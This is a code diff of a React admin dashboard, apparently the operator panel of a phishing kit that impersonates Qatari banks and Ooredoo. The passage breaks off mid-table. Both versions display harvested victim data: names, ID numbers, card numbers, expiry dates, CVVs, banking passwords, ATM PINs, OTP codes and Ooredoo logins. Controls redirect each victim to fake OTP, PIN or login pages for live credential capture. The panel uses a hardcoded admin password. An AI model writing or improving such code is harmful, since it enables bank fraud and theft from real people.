@@ -1,514 +1,430 @@
-import { useState, useMemo } from "react";
-import { useLanguage } from "@/contexts/LanguageContext";
-import { useLocation } from "wouter";
+import { useState, useEffect } from "react";
 import { trpc } from "@/lib/trpc";
-import { Dialog, DialogContent } from "@/components/ui/dialog";
-import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut, Globe, Phone, CreditCard, Calendar, Hash, MapPin, ExternalLink, ChevronDown } from "lucide-react";
-
-// --- PROFESSIONAL STYLES ---
-const styles = {
-  loginContainer: {
-    minHeight: '100vh',
-    width: '100%',
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-    backgroundColor: '#0a0a0a',
-    fontFamily: 'system-ui, -apple-system, sans-serif',
-    position: 'relative' as const,
-    overflow: 'hidden',
-  },
-  loginCard: {
-    backgroundColor: '#141414',
-    border: '1px solid #333',
-    padding: '40px',
-    borderRadius: '24px',
-    width: '100%',
-    maxWidth: '400px',
-    zIndex: 10,
-    boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)',
-    textAlign: 'center' as const,
-  },
-  input: {
-    width: '100%',
-    backgroundColor: '#000',
-    border: '1px solid #333',
-    color: '#fff',
-    padding: '16px',
-    borderRadius: '12px',
-    fontSize: '16px',
-    marginBottom: '20px',
-    outline: 'none',
-    boxSizing: 'border-box' as const,
-  },
-  button: {
-    width: '100%',
-    backgroundColor: '#e11d48',
-    color: '#fff',
-    padding: '16px',
-    borderRadius: '12px',
-    fontSize: '16px',
-    fontWeight: 'bold',
-    border: 'none',
-    cursor: 'pointer',
-    transition: 'all 0.2s',
-  },
-  dashboardContainer: {
-    minHeight: '100vh',
-    backgroundColor: '#f8fafc',
-    fontFamily: 'system-ui, -apple-system, sans-serif',
-  },
-  nav: {
-    backgroundColor: '#fff',
-    borderBottom: '1px solid #e2e8f0',
-    padding: '0 20px',
-    height: '80px',
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'space-between',
-    position: 'sticky' as const,
-    top: 0,
-    zIndex: 100,
-  },
-  statsGrid: {
-    display: 'grid',
-    gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))',
-    gap: '24px',
-    padding: '40px 20px',
-    maxWidth: '1280px',
-    margin: '0 auto',
-  },
-  statCard: {
-    padding: '32px',
-    borderRadius: '24px',
-    color: '#fff',
-    position: 'relative' as const,
-    overflow: 'hidden',
-    boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)',
-  },
-  tableContainer: {
-    maxWidth: '1280px',
-    margin: '0 auto 40px',
-    backgroundColor: '#fff',
-    borderRadius: '24px',
-    border: '1px solid #e2e8f0',
-    overflow: 'hidden',
-    boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
-  },
-  table: {
-    width: '100%',
-    borderCollapse: 'collapse' as const,
-    textAlign: 'right' as const,
-  },
-  th: {
-    padding: '20px',
-    backgroundColor: '#f8fafc',
-    color: '#64748b',
-    fontSize: '12px',
-    fontWeight: 'bold',
-    textTransform: 'uppercase' as const,
-    letterSpacing: '0.05em',
-    borderBottom: '2px solid #f1f5f9',
-  },
-  td: {
-    padding: '20px',
-    borderBottom: '1px solid #f1f5f9',
-    fontSize: '14px',
-    color: '#1e293b',
-  },
-  badge: {
-    padding: '6px 12px',
-    borderRadius: '9999px',
-    fontSize: '11px',
-    fontWeight: 'bold',
-    textTransform: 'uppercase' as const,
-  }
-};
-
-const getStatusDisplay = (currentStep: string | null | undefined, language: string) => {
-  const statusMap: Record<string, Record<string, string>> = {
-    ar: {
-      login: "تسجيل الدخول",
-      otp: "OTP الأول",
-      atm: "ATM PIN",
-      ooredoo: "Ooredoo",
-      otp_ooredoo: "OTP Ooredoo",
-      pending: "في الانتظار",
-      approved: "تمت الموافقة",
-      rejected: "تم الرفض",
-    },
-    en: {
-      login: "Login Page",
-      otp: "First OTP",
-      atm: "ATM PIN",
-      ooredoo: "Ooredoo",
-      otp_ooredoo: "Ooredoo OTP",
-      pending: "Pending",
-      approved: "Approved",
-      rejected: "Rejected",
-    },
-  };
-  return statusMap[language]?.[currentStep || "pending"] || currentStep || "—";
-};
-
-const getStatusStyles = (currentStep: string | null | undefined) => {
-  const colorMap: Record<string, { bg: string, text: string }> = {
-    login: { bg: '#dbeafe', text: '#1e40af' },
-    otp: { bg: '#f3e8ff', text: '#6b21a8' },
-    atm: { bg: '#ffedd5', text: '#9a3412' },
-    ooredoo: { bg: '#fee2e2', text: '#991b1b' },
-    otp_ooredoo: { bg: '#fce7f3', text: '#9d174d' },
-  };
-  const colors = colorMap[currentStep || ""] || { bg: '#f1f5f9', text: '#475569' };
-  return { backgroundColor: colors.bg, color: colors.text };
-};
+import { toast } from "sonner";
+import {
+  Table,
+  TableBody,
+  TableCell,
+  TableHead,
+  TableHeader,
+  TableRow,
+} from "@/components/ui/table";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogFooter,
+} from "@/components/ui/dialog";
+import {
+  DropdownMenu,
+  DropdownMenuContent,
+  DropdownMenuItem,
+  DropdownMenuTrigger,
+  DropdownMenuLabel,
+  DropdownMenuSeparator,
+} from "@/components/ui/dropdown-menu";
+import {
+  Eye,
+  LogOut,
+  Search,
+  Users,
+  CheckCircle2,
+  Clock,
+  ExternalLink,
+  ChevronRight,
+  User,
+  CreditCard,
+  Key,
+  Globe,
+  Check,
+  X,
+} from "lucide-react";
 
 export default function AdminDashboard() {
-  const { language } = useLanguage();
-  const [searchTerm, setSearchTerm] = useState("");
-  const [selectedSession, setSelectedSession] = useState<string | null>(null);
-  const [showDetails, setShowDetails] = useState(false);
-  const [showRedirectMenu, setShowRedirectMenu] = useState<string | null>(null);
   const [password, setPassword] = useState("");
-  const [isAuthenticated, setIsAuthenticated] = useState(() => {
-    return typeof window !== 'undefined' && sessionStorage.getItem('adminAuth') === 'true';
-  });
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [searchTerm, setSearchTerm] = useState("");
+  const [selectedSession, setSelectedSession] = useState<any>(null);
+  const [isDetailsOpen, setIsDetailsOpen] = useState(false);
 
-  const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
+  const { data: sessions, refetch } = trpc.submissions.getSessions.useQuery(undefined, {
     enabled: isAuthenticated,
-    refetchInterval: 1000, 
+    refetchInterval: 3000,
   });
 
-  const takeActionMutation = trpc.submissions.adminTakeAction.useMutation();
+  const updateStatusMutation = trpc.submissions.updateSessionStatus.useMutation();
+  const updateStepMutation = trpc.submissions.updateSessionStep.useMutation();
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     if (password === "Qatar@@200") {
       setIsAuthenticated(true);
-      sessionStorage.setItem('adminAuth', 'true');
+      localStorage.setItem("admin_auth", "true");
     } else {
-      alert(language === 'ar' ? "كلمة مرور خاطئة" : "Incorrect password");
+      toast.error("كلمة المرور غير صحيحة");
     }
   };
+
+  useEffect(() => {
+    if (localStorage.getItem("admin_auth") === "true") {
+      setIsAuthenticated(true);
+    }
+  }, []);
 
   const handleLogout = () => {
     setIsAuthenticated(false);
-    sessionStorage.removeItem('adminAuth');
+    localStorage.removeItem("admin_auth");
   };
 
-  const handleAction = async (sessionId: string, action: string, errorMsg?: string, redirectTarget?: string) => {
+  const handleStatusUpdate = async (sessionId: string, status: string) => {
     try {
-      await takeActionMutation.mutateAsync({ sessionId, action, errorMessage: errorMsg, redirectTarget });
-      setShowRedirectMenu(null);
+      await updateStatusMutation.mutateAsync({ sessionId, status });
+      toast.success(`تم تحديث الحالة إلى: ${status}`);
       refetch();
     } catch (error) {
-      console.error("Action error:", error);
+      toast.error("فشل تحديث الحالة");
     }
   };
 
-  const filteredSubmissions = useMemo(() => {
-    if (!submissions) return [];
-    return submissions.filter((s: any) => 
-      s.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      (s.personalData?.nameArabic || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
-      (s.personalData?.nameEnglish || "").toLowerCase().includes(searchTerm.toLowerCase())
-    );
-  }, [submissions, searchTerm]);
+  const handleRedirect = async (sessionId: string, step: string) => {
+    try {
+      await updateStepMutation.mutateAsync({ sessionId, step });
+      toast.success(`تم توجيه العميل إلى: ${step}`);
+      refetch();
+    } catch (error) {
+      toast.error("فشل توجيه العميل");
+    }
+  };
 
-  const stats = useMemo(() => {
-    if (!submissions) return { total: 0, pending: 0, approved: 0 };
-    return {
-      total: submissions.length,
-      pending: submissions.filter((s: any) => s.status === 'pending' || s.status === 'loading').length,
-      approved: submissions.filter((s: any) => s.status === 'approved').length,
-    };
-  }, [submissions]);
+  const filteredSessions = sessions?.filter(
+    (s) =>
+      s.sessionId.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      s.fullName?.toLowerCase().includes(searchTerm.toLowerCase())
+  );
 
   if (!isAuthenticated) {
     return (
-      <div style={styles.loginContainer}>
-        <div style={styles.loginCard}>
-          <div style={{ marginBottom: '32px' }}>
-            <div style={{ backgroundColor: '#e11d48', width: '64px', height: '64px', borderRadius: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
-              <Lock color="#fff" size={32} />
+      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center p-4">
+        <div className="w-full max-w-md bg-[#1e293b] rounded-2xl shadow-2xl p-8 border border-[#334155]">
+          <div className="text-center mb-8">
+            <div className="w-16 h-16 bg-[#8C0032] rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
+              <Key className="text-white w-8 h-8" />
             </div>
-            <h1 style={{ color: '#fff', fontSize: '24px', fontWeight: 'bold', margin: '0 0 8px 0' }}>{language === 'ar' ? "لوحة التحكم" : "Admin Panel"}</h1>
-            <p style={{ color: '#666', fontSize: '14px' }}>{language === 'ar' ? "يرجى إدخال كلمة المرور للمتابعة" : "Enter password to continue"}</p>
+            <h1 className="text-2xl font-bold text-white mb-2">لوحة التحكم</h1>
+            <p className="text-[#94a3b8] text-sm">يرجى إدخال كلمة المرور للمتابعة</p>
           </div>
-          <form onSubmit={handleLogin}>
-            <input
+          <form onSubmit={handleLogin} className="space-y-6">
+            <Input
               type="password"
-              placeholder={language === 'ar' ? "كلمة المرور" : "Password"}
-              style={styles.input}
+              placeholder="كلمة المرور"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              autoFocus
+              className="bg-[#0f172a] border-[#334155] text-white h-12 focus:ring-[#8C0032]"
             />
-            <button type="submit" style={styles.button}>{language === 'ar' ? "دخول" : "Sign In"}</button>
+            <Button type="submit" className="w-full h-12 bg-[#8C0032] hover:bg-[#a8003d] text-white font-bold rounded-xl transition-all">
+              دخول
+            </Button>
           </form>
         </div>
       </div>
     );
   }
 
-  const selectedData = submissions?.find((s: any) => s.id === selectedSession);
+  const stats = [
+    { label: "إجمالي الزوار", value: sessions?.length || 0, icon: Users, color: "bg-blue-500" },
+    { label: "طلبات نشطة", value: sessions?.filter(s => s.status === "pending").length || 0, icon: Clock, color: "bg-amber-500" },
+    { label: "تمت الموافقة", value: sessions?.filter(s => s.status === "accepted").length || 0, icon: CheckCircle2, color: "bg-emerald-500" },
+  ];
 
   return (
-    <div style={styles.dashboardContainer} dir={language === 'ar' ? 'rtl' : 'ltr'}>
-      <nav style={styles.nav}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-          <div style={{ backgroundColor: '#e11d48', width: '40px', height: '40px', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-            <Users color="#fff" size={20} />
+    <div className="min-h-screen bg-[#f8fafc] pb-12">
+      {/* Header */}
+      <div className="bg-white border-b sticky top-0 z-10 shadow-sm">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+          <div className="flex items-center gap-3">
+            <div className="bg-[#8C0032] p-2 rounded-lg">
+              <Users className="text-white w-6 h-6" />
+            </div>
+            <h1 className="text-xl font-bold text-[#1e293b]">إدارة الطلبات</h1>
           </div>
-          <h1 style={{ fontSize: '20px', fontWeight: 'bold', color: '#1e293b' }}>{language === 'ar' ? "إدارة الطلبات" : "Submissions"}</h1>
-        </div>
-        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
-          <div style={{ position: 'relative' }}>
-            <input
-              type="text"
-              placeholder={language === 'ar' ? "بحث بالاسم أو الكود..." : "Search..."}
-              style={{ padding: '10px 16px', borderRadius: '12px', border: '1px solid #e2e8f0', width: '240px', outline: 'none', fontSize: '14px' }}
-              value={searchTerm}
-              onChange={(e) => setSearchTerm(e.target.value)}
-            />
+          <div className="flex items-center gap-4">
+            <div className="relative hidden sm:block">
+              <Search className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
+              <Input
+                placeholder="بحث بالاسم أو الكود..."
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+                className="pr-10 w-64 bg-slate-50 border-slate-200 focus:bg-white"
+              />
+            </div>
+            <Button variant="outline" onClick={handleLogout} className="gap-2 border-slate-200 hover:bg-slate-50 text-slate-600">
+              <LogOut className="w-4 h-4" />
+              خروج
+            </Button>
           </div>
-          <button onClick={handleLogout} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '10px 16px', borderRadius: '12px', border: '1px solid #fee2e2', color: '#e11d48', backgroundColor: '#fff', cursor: 'pointer', fontSize: '14px', fontWeight: 'bold' }}>
-            <LogOut size={18} />
-            {language === 'ar' ? "خروج" : "Logout"}
-          </button>
-        </div>
-      </nav>
-
-      <div style={styles.statsGrid}>
-        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #6366f1 0%, #4f46e5 100%)' }}>
-          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "إجمالي الزوار" : "Total Visitors"}</p>
-          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.total}</h2>
-          <Users style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
-        </div>
-        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #f59e0b 0%, #d97706 100%)' }}>
-          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "طلبات نشطة" : "Active Sessions"}</p>
-          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.pending}</h2>
-          <RefreshCcw style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
-        </div>
-        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)' }}>
-          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "تمت الموافقة" : "Approved"}</p>
-          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.approved}</h2>
-          <Check style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
         </div>
       </div>
 
-      <div style={styles.tableContainer}>
-        {isLoading ? (
-          <div style={{ padding: '100px', textAlign: 'center' }}>
-            <Loader2 className="animate-spin" size={48} color="#e11d48" style={{ margin: '0 auto' }} />
-          </div>
-        ) : (
-          <table style={styles.table}>
-            <thead>
-              <tr>
-                <th style={styles.th}>{language === 'ar' ? "الكود" : "ID"}</th>
-                <th style={styles.th}>{language === 'ar' ? "البنك" : "Bank"}</th>
-                <th style={styles.th}>{language === 'ar' ? "الدولة" : "Country"}</th>
-                <th style={styles.th}>{language === 'ar' ? "الاسم" : "Name"}</th>
-                <th style={styles.th}>{language === 'ar' ? "المرحلة" : "Step"}</th>
-                <th style={styles.th}>{language === 'ar' ? "التوقيت" : "Time"}</th>
-                <th style={styles.th}>{language === 'ar' ? "الإجراءات" : "Actions"}</th>
-              </tr>
-            </thead>
-            <tbody>
-              {filteredSubmissions.map((s: any) => (
-                <tr key={s.id} style={{ backgroundColor: selectedSession === s.id ? '#f8fafc' : 'transparent' }}>
-                  <td style={styles.td}><span style={{ fontFamily: 'monospace', color: '#64748b' }}>{s.id.substring(0, 8)}...</span></td>
-                  <td style={styles.td}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                      <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#e11d48' }}></div>
-                      {s.selectedBank.toUpperCase()}
-                    </div>
-                  </td>
-                  <td style={styles.td}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: '#64748b' }}>
-                      <MapPin size={14} />
-                      {s.country || "Qatar"}
-                    </div>
-                  </td>
-                  <td style={styles.td}>{s.personalData?.nameArabic || s.personalData?.nameEnglish || "—"}</td>
-                  <td style={styles.td}>
-                    <span style={{ ...styles.badge, ...getStatusStyles(s.currentStep) }}>
-                      {getStatusDisplay(s.currentStep, language)}
-                    </span>
-                  </td>
-                  <td style={styles.td}>{new Date(s.createdAt).toLocaleTimeString(language === 'ar' ? 'ar-QA' : 'en-US')}</td>
-                  <td style={styles.td}>
-                    <div style={{ display: 'flex', gap: '8px' }}>
-                      <button 
-                        onClick={() => { setSelectedSession(s.id); setShowDetails(true); }} 
-                        style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '8px 12px', borderRadius: '8px', border: '1px solid #e2e8f0', backgroundColor: '#fff', cursor: 'pointer', color: '#64748b', fontSize: '12px', fontWeight: 'bold' }}
-                      >
-                        <Eye size={16} />
-                        {language === 'ar' ? "التفاصيل" : "Details"}
-                      </button>
-                      
-                      <div style={{ position: 'relative' }}>
-                        <button 
-                          onClick={() => setShowRedirectMenu(showRedirectMenu === s.id ? null : s.id)} 
-                          style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '8px 16px', borderRadius: '8px', backgroundColor: '#e11d48', color: '#fff', border: 'none', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}
-                        >
-                          <ExternalLink size={16} />
-                          {language === 'ar' ? "إعادة توجيه" : "Redirect"}
-                          <ChevronDown size={14} />
-                        </button>
-                        
-                        {showRedirectMenu === s.id && (
-                          <div style={{ position: 'absolute', top: '100%', right: 0, marginTop: '8px', backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)', zIndex: 50, width: '200px', padding: '8px', display: 'flex', flexDirection: 'column', gap: '4px' }}>
-                            <div style={{ padding: '8px', fontSize: '11px', fontWeight: 'bold', color: '#94a3b8', borderBottom: '1px solid #f1f5f9' }}>{language === 'ar' ? "تحكم بالعميل" : "User Control"}</div>
-                            <button onClick={() => handleAction(s.id, 'approve')} style={{ width: '100%', textAlign: 'right', padding: '10px', border: 'none', backgroundColor: '#f0fdf4', color: '#166534', cursor: 'pointer', borderRadius: '8px', fontSize: '13px', fontWeight: 'bold' }}>✅ {language === 'ar' ? "قبول (متابعة)" : "Accept"}</button>
-                            <button onClick={() => handleAction(s.id, 'reject', 'بيانات غير صحيحة')} style={{ width: '100%', textAlign: 'right', padding: '10px', border: 'none', backgroundColor: '#fef2f2', color: '#991b1b', cursor: 'pointer', borderRadius: '8px', fontSize: '13px', fontWeight: 'bold' }}>❌ {language === 'ar' ? "رفض (إعادة محاولة)" : "Reject"}</button>
-                            
-                            <div style={{ padding: '8px', fontSize: '11px', fontWeight: 'bold', color: '#94a3b8', borderBottom: '1px solid #f1f5f9', marginTop: '4px' }}>{language === 'ar' ? "توجيه لصفحة محددة" : "Direct to Page"}</div>
-                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'login-method')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>📄 {language === 'ar' ? "صفحة الدخول" : "Login Page"}</button>
-                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'otp')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>🔑 {language === 'ar' ? "صفحة OTP" : "OTP Page"}</button>
-                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'atm-pin')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>💳 {language === 'ar' ? "صفحة ATM PIN" : "ATM PIN Page"}</button>
-                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'ooredoo')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>🌐 {language === 'ar' ? "صفحة Ooredoo" : "Ooredoo Page"}</button>
-                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'otp-ooredoo')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>📱 {language === 'ar' ? "صفحة OTP Ooredoo" : "OTP Ooredoo Page"}</button>
-                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'success')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>✨ {language === 'ar' ? "صفحة النجاح" : "Success Page"}</button>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-                  </td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
-        )}
-      </div>
-
-      <Dialog open={showDetails} onOpenChange={setShowDetails}>
-        <DialogContent style={{ maxWidth: '600px', padding: 0, borderRadius: '24px', overflow: 'hidden', border: 'none' }}>
-          {selectedData && (
-            <div dir={language === 'ar' ? 'rtl' : 'ltr'} style={{ backgroundColor: '#fff' }}>
-              <div style={{ backgroundColor: '#e11d48', padding: '32px', color: '#fff' }}>
-                <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>{language === 'ar' ? "كل بيانات العميل" : "All Client Data"}</h2>
-                <p style={{ opacity: 0.8, fontSize: '14px' }}>ID: {selectedData.id}</p>
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8">
+        {/* Stats Grid */}
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+          {stats.map((stat, i) => (
+            <div key={i} className="bg-white p-6 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-4">
+              <div className={`${stat.color} p-4 rounded-xl text-white`}>
+                <stat.icon className="w-6 h-6" />
               </div>
-              
-              <div style={{ padding: '32px', display: 'flex', flexDirection: 'column', gap: '24px', maxHeight: '70vh', overflowY: 'auto' }}>
-                {/* Personal Data */}
-                <section>
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
-                    <Users size={20} />
-                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "البيانات الشخصية" : "Personal Data"}</h3>
-                  </div>
-                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
-                    <div>
-                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "الاسم" : "Name"}</p>
-                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.nameArabic || "—"}</p>
-                    </div>
-                    <div>
-                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم الجوال" : "Phone"}</p>
-                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.phoneNumber || "—"}</p>
-                    </div>
-                    <div>
-                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم الهوية" : "ID Number"}</p>
-                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.idNumber || "—"}</p>
-                    </div>
-                    <div>
-                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "الدولة" : "Country"}</p>
-                      <p style={{ fontWeight: '500' }}>{selectedData.country || "Qatar"}</p>
-                    </div>
-                  </div>
-                </section>
-
-                {/* Login Method */}
-                <section>
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
-                    <CreditCard size={20} />
-                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "بيانات تسجيل الدخول" : "Login Data"}</h3>
-                  </div>
-                  <div style={{ backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
-                    {selectedData.loginMethod?.loginType === 'card' ? (
-                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
-                        <div style={{ gridColumn: '1 / -1' }}>
-                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم البطاقة" : "Card Number"}</p>
-                          <p style={{ fontWeight: 'bold', fontSize: '18px', letterSpacing: '2px' }}>{selectedData.loginMethod.cardNumber}</p>
-                        </div>
-                        <div>
-                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "التاريخ" : "Expiry"}</p>
-                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod.expiryDate}</p>
-                        </div>
-                        <div>
-                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>CVV</p>
-                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod.cvv}</p>
-                        </div>
-                      </div>
-                    ) : (
-                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
-                        <div>
-                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "اسم المستخدم" : "Username"}</p>
-                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod?.username || "—"}</p>
-                        </div>
-                        <div>
-                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "كلمة المرور" : "Password"}</p>
-                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod?.password || "—"}</p>
-                        </div>
-                      </div>
-                    )}
-                  </div>
-                </section>
-
-                {/* PIN & OTP */}
-                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
-                  <section>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', color: '#e11d48' }}>
-                      <Hash size={18} />
-                      <h3 style={{ fontWeight: 'bold', fontSize: '14px' }}>ATM PIN</h3>
-                    </div>
-                    <div style={{ backgroundColor: '#f8fafc', padding: '16px', borderRadius: '12px', textAlign: 'center' }}>
-                      <p style={{ fontSize: '20px', fontWeight: 'bold', letterSpacing: '4px' }}>{selectedData.atmPin?.pin || "—"}</p>
-                    </div>
-                  </section>
-                  <section>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', color: '#e11d48' }}>
-                      <RefreshCcw size={18} />
-                      <h3 style={{ fontWeight: 'bold', fontSize: '14px' }}>OTP Codes</h3>
-                    </div>
-                    <div style={{ backgroundColor: '#f8fafc', padding: '16px', borderRadius: '12px' }}>
-                      {selectedData.otps?.length > 0 ? (
-                        selectedData.otps.map((o: any, i: number) => (
-                          <div key={i} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: i === selectedData.otps.length - 1 ? 0 : '8px' }}>
-                            <span style={{ fontWeight: 'bold' }}>{o.otpCode}</span>
-                            <span style={{ fontSize: '10px', color: '#64748b' }}>{o.otpType}</span>
-                          </div>
-                        ))
-                      ) : "—"}
-                    </div>
-                  </section>
-                </div>
-
-                {/* Ooredoo Data */}
-                <section>
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
-                    <Globe size={20} />
-                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "بيانات Ooredoo" : "Ooredoo Data"}</h3>
-                  </div>
-                  <div style={{ backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
-                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
-                      <div>
-                        <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "اسم المستخدم" : "Username"}</p>
-                        <p style={{ fontWeight: '500' }}>{selectedData.ooredoo?.ooredooUser || "—"}</p>
-                      </div>
-                      <div>
-                        <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "كلمة المرور" : "Password"}</p>
-                        <p style={{ fontWeight: '500' }}>{selectedData.ooredoo?.ooredooPassword || "—"}</p>
-                      </div>
-                    </div>
-                  </div>
-                </section>
+              <div>
+                <p className="text-sm font-medium text-slate-500">{stat.label}</p>
+                <p className="text-2xl font-bold text-slate-900">{stat.value}</p>
               </div>
             </div>
-          )}
+          ))}
+        </div>
+
+        {/* Table Container */}
+        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 overflow-hidden">
+          <Table>
+            <TableHeader className="bg-slate-50">
+              <TableRow>
+                <TableHead className="text-right font-bold text-slate-700">الكود</TableHead>
+                <TableHead className="text-right font-bold text-slate-700">البنك</TableHead>
+                <TableHead className="text-right font-bold text-slate-700">الدولة</TableHead>
+                <TableHead className="text-right font-bold text-slate-700">الاسم</TableHead>
+                <TableHead className="text-right font-bold text-slate-700">المرحلة</TableHead>
+                <TableHead className="text-right font-bold text-slate-700">التوقيت</TableHead>
+                <TableHead className="text-center font-bold text-slate-700">الإجراءات</TableHead>
+              </TableRow>
+            </TableHeader>
+            <TableBody>
+              {filteredSessions?.map((session) => (
+                <TableRow key={session.id} className="hover:bg-slate-50/50 transition-colors">
+                  <TableCell className="font-mono text-xs text-slate-500">...{session.sessionId.slice(-8)}</TableCell>
